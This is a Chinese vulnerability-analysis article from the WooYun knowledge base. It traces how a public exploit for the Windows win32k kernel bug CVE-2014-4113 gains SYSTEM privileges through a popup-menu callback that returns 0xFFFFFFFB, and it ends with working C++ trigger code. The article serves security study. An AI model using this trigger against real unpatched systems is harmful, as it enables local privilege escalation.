<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">CVE-2014-4113漏洞利用过程分析</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">cssembly</a> <span class="bull">·</span> <time title="2014/10/24 14:13" ui-time="" datetime="2014/10/24 14:13" class="published ng-binding ng-isolate-scope">2014/10/24 14:13</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 简介</h2><hr><p>通过VMware和Windbg搭建32位内核调试环境，系统为xp sp2，执行漏洞利用程序win32.exe calc.exe，弹出了一个SYSTEM权限的calc。</p><p><img alt="enter image description here" img-src="12cc3e8bf961caa1366d0c4dad47790e6846a0b8.jpg"></p><p>通过IDA分析<code>win32.exe</code>，可以看到<code>signed int __cdecl sub_4010F2()</code>函数通过调用<code>ZwQuerySystemInformation</code>泄露内核模块<code>ntkrnlpa.exe</code>基址，最终得到<code>PsLookupProcessByProcessId</code>函数地址，该函数用于漏洞利用代码。</p><p><img alt="enter image description here" img-src="6b514c28e525b73f68b17d79ce0e89e4a385bb94.jpg"></p><p><code>sub_401830</code>函数是漏洞利用代码，完成权限提升操作。</p><p><img alt="enter image description here" img-src="3a62c44a0a016d62de7bd5e8bad4b3c89c564457.jpg"></p><h2>0x01 调试过程</h2><hr><p>通过在函数上设置断点，可以得到漏洞利用触发位置。</p><p><img alt="enter image description here" img-src="eeb4b4ecb05ed6241c113f9bf667f8c94d36b668.jpg"></p><p>可见是由<code>TrackPopupMenu</code>最终触发了漏洞，调用点为<code>call dwordptr[esi+20]</code>，此时<code>esi</code>的值为<code>0xfffffffb</code>。 通过函数调用栈，对esi值的来源进行反向跟踪，可以知道在Menu的消息处理函数<code>signed int __stdcall xxxHandleMenuMessages(int a1, int a2, int a3)</code>中调用<code>int __stdcall xxxMNFindWindowFromPoint(int a1, int a2, unsigned int a3)</code>时返回了异常的值，最终触发了漏洞。</p><p><img alt="enter image description here" img-src="dd58fafa5f2eca72aa1cc304f65d91605b41b089.jpg"></p><p>通过对<code>xxxMNFindWindowFromPoint</code>的调用过程进行分析，找到异常的返回值是在<code>int __stdcall SfnOUTDWORDINDWORD(int a1, int a2, int a3, int a4, int a5, int a6, char a7, int a8)</code>中得到的。异常的值最终是由<code>KeUserModeCallback</code>函数通过v28指向的值返回。其中<code>KeUserModeCallback</code>函数的原型如下：</p><pre><code>#!cpp
NTSTATUS
KeUserModeCallback (
     IN ULONGApiNumber,
     IN PVOIDInputBuffer,
     IN ULONGInputLength,
     OUT PVOID *OutputBuffer,
     IN PULONGOutputLength
     );
</code></pre><p><img alt="enter image description here" img-src="eead3c4f232562c0b763646e5b50b358e05fd849.jpg"></p><p>内核态的<code>KeUserModeCallback</code>函数最终会调用<code>ntdll</code>中的<code>KiUserCallbackDispatcher</code>函数来调用用户态回调函数，通过对<code>KeUserModeCallback</code>、<code>KiUserCallbackDispatcher</code>设置断点，可以看到第一次处理<code>0x1EB(MN_FINDWINDOWFROMPOINT)</code>消息是通过<code>xxxSendMessageTimeout</code>中调用的xxxCallHook来调用用户注册的钩子函数，在用户空间里函数调用了USER32中的<code>__fnOUTDWORDINDWORD</code>函数，最终调用<code>sub_401475（pfnFilterProc）</code>函数。</p><p><img alt="enter image description here" img-src="bab801dc65cb0f1b7ce4df398a8c87a11950eb18.jpg"></p><p><img alt="enter image description here" img-src="6a8036b92448b01b5128da43075f28db2e4e0bc4.jpg"></p><p><img alt="enter image description here" img-src="5b924c56cf721402bc81806bb69b735b678d382f.jpg"></p><p>程序在<code>pfnFilterProc</code>中通过<code>SetWindowLongA</code>设置PopupMenu的窗口消息处理函数，那么当xxxCallHook函数返回后，图中的<code>!(*(_BYTE *)(a1 + 22) &amp; 4)</code>条件成立，将执行<code>xxxSendMessageToClient</code>，该函数内将执行<code>KeUserModeCallback</code>，最终调用用户态函数<code>sub_4013F3</code>。</p><p><img alt="enter image description here" img-src="ea8b06242394d9d01484b7bc0dbad0305ef8212e.jpg"></p><p><img alt="enter image description here" img-src="f428810b7f02ab26b53bc60f176da449cedbabb0.jpg"></p><p><code>sub_4013F3</code>函数尾部返回了<code>0xFFFFFFFB</code>。与<code>KeUserModeCallback</code>函数通过v28返回的值相等。为了进一步确认，修改<code>sub_4013F3</code>函数返回值为<code>0xFFFFFFFF</code>。可以看到v28指向的值变成了<code>0xFFFFFFF</code>。</p><p><img alt="enter image description here" img-src="27a1f185f355447cc9d64ac6663499fb5cd898b2.jpg"></p><p><img alt="enter image description here" img-src="014c7210efb79706598e3c178cc9f4a939777bed.jpg"></p><p>通过修改win32.exe中的指令，将<code>0x40146D</code>处的<code>push 0FFFFFFFBh</code>修改为<code>push 0FFFFFFFFh</code>，执行之后发现提权失败。进一步确定由于内核的使用了异常的函数返回值，最终导致了权限提升。</p><p><img alt="enter image description here" img-src="31cef537b2fd137a53475177645990578bde019c.jpg"></p><p>可见在<code>PopupMenu</code>的窗口消息处理函数处理0x1EB的消息时，没有判断消息函数的返回值，最终导致了权限提升。 所以漏洞触发的完整过程如下：通过模仿点击事件，<code>CreatePopupMenu</code>创建的<code>PopupMenu</code>会收到<code>0x1EB</code>类型的消息，因为无法拿到<code>PopupMenu</code>的窗口句柄，程序并没有办法直接设置<code>PopupMenu</code>的窗口消息处理函数，因此首先通过<code>SetWindowsHookExA</code>注册钩子函数，在钩子函数中得到<code>PopupMenu</code>的窗口句柄，再通过<code>SetWindowLongA</code>设置<code>PopupMenu</code>的窗口消息处理函数，注册之后，<code>xxxSendMessageToClient</code>将调用新的窗口消息处理函数，接收并处理0x1EB的消息。 在新的窗口消息处理函数中，对于消息号为<code>0x1EB</code>的消息，函数返回了<code>0xFFFFFFFB</code>，最终触发了漏洞。</p><p><img alt="enter image description here" img-src="41f781335fb8f91e4ed43206de7384514b7c1d13.jpg"></p><h2>0x02 触发代码</h2><hr><p>通过上面的分析，根据win32.exe中代码，稍加简化，可以得到如下的漏洞触发代码。</p><pre><code>#!cpp
#include"stdafx.h"
#include&lt;windows.h&gt;
DWORD dword_40DA54=0,dword_40DA5C=0;
WNDPROC lpPrevWndFunc = NULL;
LRESULT CALLBACK sub_4014D2(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam )
{
if ( Msg == WM_ENTERIDLE )
  {
if ( dword_40DA5C != 1 )
    {
      dword_40DA5C = 1;
//模仿点击消息，触发0x1EB消息处理，执行pfnFilterProc
      PostMessageA(hWnd, WM_KEYDOWN, 0x28u, 0);
      PostMessageA(hWnd, WM_KEYDOWN, 0x27u, 0);
      PostMessageA(hWnd, WM_LBUTTONDOWN, 0, 0);
    }
  }
return DefWindowProcA( hWnd,Msg,wParam,lParam);
}
int __cdecl sub_401306()
{
  HMENU v0; // <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ef8a8d97afde">[email&#160;protected]</a>
  HMENU v1; // <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="92f7f6fbd2a6">[email&#160;protected]</a>
  MENUITEMINFOA mi; // [sp+Ch] [bp-64h]@1
  MENUITEMINFOA v4; // [sp+3Ch] [bp-34h]@1
  HMENU v9; // [sp+6Ch] [bp-4h]@1

  v9 = 0;
  memset((void *)&amp;mi, 0, sizeof(mi));
  memset(&amp;v4, 0, sizeof(MENUITEMINFOA));
  mi.cbSize = 48;
  v0 = CreatePopupMenu();
if ( v0 )
  {
    mi.fMask = 64;
if ( InsertMenuItemA(v0, 0, 1, &amp;mi) )
    {
      v4.fMask = 68;
      v4.dwTypeData = (LPSTR)&amp;dword_40DA54;
      v4.cch = 1;
      v4.hSubMenu = v0;
      v4.cbSize = 48;
      v1 = CreatePopupMenu();
      v9 = v1;
if ( !v1 || !InsertMenuItemA(v1, 0, 1, (LPCMENUITEMINFOA)&amp;v4) )
      {
        DestroyMenu(v0);
if ( v1 )
          DestroyMenu(v1);
      }
    }
else
      DestroyMenu(v0);
  }
return (int)v9;
}

unsigned int __stdcall sub_4013F3(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
if ( Msg != 0x1EB )
return CallWindowProcA(lpPrevWndFunc, hWnd, Msg, wParam, lParam);
return 0xFFFFFFFBu;//返回xFFFFFFFB，触发漏洞
}

LRESULT __stdcall pfnFilterProc(int nCode, WPARAM wParam, LPARAM lParam)
{
if ( *(DWORD *)(lParam + 8) == 0x1EB )
  {
        UnhookWindowsHook(4, pfnFilterProc);
        //设置PopupMenu的窗口消息处理函数
        lpPrevWndFunc = (WNDPROC)SetWindowLongA(*(HWND *)(lParam + 12), -4, (LONG)sub_4013F3);
  }
return CallNextHookEx(0, nCode, wParam, lParam);
}

int __stdcall Exp()
{
int v1; // <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3c595e447c0f">[email&#160;protected]</a>
  DWORD v2; // <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ef8a8e97afda">[email&#160;protected]</a>
int result; // <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8eebeff6cebfbc">[email&#160;protected]</a>
  HWND hWnd; // [sp+10h] [bp-58h]@2
signed int v5; // [sp+14h] [bp-54h]@1
  LPVOID lpAddress; // [sp+18h] [bp-50h]@1
struct _SYSTEM_INFO SystemInfo; // [sp+1Ch] [bp-4Ch]@1
  WNDCLASSA WndClass; // [sp+40h] [bp-28h]@1
  v5 = 0;
  lpAddress = 0;
  memset(&amp;SystemInfo, 0, 0x24u);
  memset(&amp;WndClass, 0, 0x28u);
  WndClass.lpfnWndProc = (WNDPROC)sub_4014D2;
  WndClass.lpszClassName = "woqunimalegebi";
  GetNativeSystemInfo(&amp;SystemInfo);
if ( 
SystemInfo.dwOemId != 9
&amp;&amp; (RegisterClassA(&amp;WndClass)
&amp;&amp;(hWnd = CreateWindowExA(0, WndClass.lpszClassName, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0)) !=0) 
)
  {
v1 = 0;
v5 = 1;
    v1 = sub_401306();
    if ( v1 )
    {
        v2 = GetCurrentThreadId();
        SetWindowsHookExA(4, pfnFilterProc, 0, v2);
        TrackPopupMenu((HMENU)v1, 0, 0xFFFFD8F0u, 0xFFFFD8F0u, 0, hWnd, 0);
    }
    DestroyWindow(hWnd);
if ( v1 )
      DestroyMenu((HMENU)v1);
    UnhookWindowsHook(4, pfnFilterProc);
if ( v5 )
      VirtualFree(lpAddress, 0, 0x8000u);
    result = 0;
  }
else
    result = 0;
return result;
}

int _tmain(int argc, _TCHAR* argv[])
{
    Exp();
    return 0;
}
</code></pre><p>编译执行之后，可以看到触发了异常。</p><p><img alt="enter image description here" img-src="3dd2d1793281e83bd0274847321205adcdba2481.jpg"></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Love.china.coco</span> <span class="reply-time">2014-11-21 14:29:56</span></div><p></p><p>大神 你好，请问我怎么样才可以和你一样 漏洞分析的。求推荐几个语言，先学什么好。C还是汇编。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小胖子</span> <span class="reply-time">2014-10-26 17:31:46</span></div><p></p><p>沙发，撒花~</p><p></p></div></div></div></div></div></main>